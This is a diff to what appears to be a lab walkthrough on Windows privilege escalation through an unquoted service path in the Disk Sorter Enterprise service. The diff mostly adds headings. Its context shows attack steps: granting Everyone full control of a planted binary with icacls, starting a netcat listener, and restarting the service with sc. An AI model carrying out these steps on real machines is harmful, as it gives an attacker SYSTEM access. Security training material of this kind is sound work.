@@ -20,8 +20,8 @@ When the `SCM` **(Service Control Manager)** tries to Execute the Binary, a prob
 
 ---
 
-<br/>
 
+## Service Analysis
 
 - <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enterprise</b> Service has <span style={{fontWeight: 'Bold'}}>Unquoted Service Paths.</span>
 
@@ -57,6 +57,8 @@ C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 
 <br/>
 
+### PAYLOAD
+
 - Generating and Transferring the **PAYLOAD**
 
 ```js
@@ -75,8 +77,10 @@ C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 
 <br/>
 
+### Restarting The Service
+
 - Starting a `netcat` Listener.
-- Restarting the <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enterprise</b> Service. 
+- Restarting the <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enterprise</b> Service. **[In a Normal case Scenario we would have to Wait for a Service Restart]**
 
 ```log
 C:\> sc stop  "Disk Sorter Enterprise"
